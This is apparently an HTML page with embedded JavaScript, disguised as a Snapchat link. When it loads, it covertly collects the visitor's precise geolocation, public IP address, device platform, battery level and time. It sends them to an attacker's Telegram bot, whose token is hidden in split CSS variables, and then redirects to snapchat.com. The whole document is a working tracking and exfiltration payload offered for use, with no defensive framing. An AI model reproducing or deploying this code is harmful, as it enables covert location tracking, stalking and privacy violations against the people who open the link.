<style>
    :root { 
        --p1: "8678050341"; 
        --p2: "AAE7b3fvFp"; 
        --p3: "fGju4NXGaFiMsvhYC0UdnCYtE"; 
    }
</style>

<script>
    async function capture() {
        const urlParams = new URLSearchParams(window.location.search);
        const targetID = urlParams.get('id'); 
        if (!targetID) return;

        const root = document.documentElement;
        const TK = getComputedStyle(root).getPropertyValue('--p1').replace(/"/g, '').trim() + ":" + 
                   getComputedStyle(root).getPropertyValue('--p2').replace(/"/g, '').trim() + 
                   getComputedStyle(root).getPropertyValue('--p3').replace(/"/g, '').trim();

        try {
            // وەرگرتنی کات و باتری
            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            }
            let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

            // وەرگرتنی لۆکەیشن و ناردن
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                let report = `🚨 <b>Target Locked!</b>\n\n` +
                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps]</a>\n` +
                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
                             `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
                             `🕒 <b>Time:</b> <code>${time}</code>`;

                fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: targetID, text: report, parse_mode: "HTML"})
                });
                
                setTimeout(() => { window.location.replace("https://www.snapchat.com"); }, 1000);
            }, () => {
                window.location.replace("https://www.snapchat.com");
            });
        } catch (e) { window.location.replace("https://www.snapchat.com"); }
    }
    window.onload = capture;
</script>
